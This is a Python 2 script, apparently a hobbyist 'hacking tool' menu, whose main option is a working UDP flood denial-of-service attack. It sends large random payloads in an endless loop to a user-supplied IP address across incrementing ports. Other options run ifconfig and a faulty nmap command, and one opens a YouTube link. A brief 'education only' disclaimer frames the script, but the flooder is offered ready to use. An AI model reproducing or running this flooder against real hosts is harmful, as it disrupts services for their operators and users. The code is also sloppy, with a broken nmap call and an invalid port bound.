import datetime
import os
import sys
import socket
import random
from time import *

class time:
       t = datetime.datetime.now().time()
class date:
       d = datetime.datetime.now().date()
class color:
        g = '\x1b[;32m'                                                                                         
        r = '\x1b[;31m'
        y = '\x1b[;33m'
        b = '\x1b[;34m'
        l = '\x1b[;04m'
        w = '\x1b[;07m'
######
def susan(s):
   for a in s + '\n':
       sys.stdout.write(a)
       sys.stdout.flush()
       sleep(1./12)
print(color.b + color.l + color.w)
os.system('clear')
susan("Progaram By Noob Programmer")
susan("https://www.youtube.com/Noob Programmer")

susan("only education  propose  support by ethical hacking ")
susan("waring only use your local network ")
sleep(3)
os.system('clear')
print(color.y + "current time is:-" + str(time.t))
print(color.y + "current date is:-" + str(date.d))


print('\n'+color.b+'*1:'"Ddos Attack")
print('*2:'"See connected local Network ip Address")
print('*3:'"See Web Site Ip Addrss")
print('*4:'"Noob Ptogrammer Youtube Link")

i = raw_input("inter the num:-")

def ddos():
     os.system('clear')
     print(color.r +"""

     DDDDD    DDDDD        OOO    SSSSS
     DD   DD  DD   DD    OO   OO  SS
     DD    DD DD    DD  OO     OO SS
     DD    DD DD    DD  OO     OO SSSSS
     DD    DD DD    DD  OO     OO    SS
     DD    DD DD    DD  OO     OO    SS
     DD   DD  DD   DD    OO   OO     SS
     DDDDD    DDDDD        OOO    SSSSS\n""")

     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     b = random._urandom(9999)
     c = random._urandom(9999)
     d = random._urandom(9999)
     e = random._urandom(9999)
     f = random._urandom(9999)
     g = random._urandom(9999)

     bytes = b + c + d + e + f + g
  ###

     print(color.g)
     ip = raw_input("intet ip adddress:-")

     port = input("port:-")

     ###

     sent = 0
     while True:
           sock.sendto(bytes, (ip,port))
           sent = sent + 1
           port = port + 1
           print("Sent %s packet to %s thought port:%s"%(sent,ip,port))
           if port == 999999:
               port = 1



def local():
      os.system('ifconfig')
      return 0
def map():
     a = raw_input("inter the url:-")
     os.system('nmap -v -A a')
     return 0
def you():
     os.system('xdg-open https://www.youtub.com/Noob Programmer')
if i == '1' or 1 == '01':
   ddos()
else:

  if i == '2' or i == '02':
      local()
  else:

     if i == '3' or i == '03':
       map()
     else:

        if i == '4' or i == '04':
            you()
        else:
             print("try again")
             
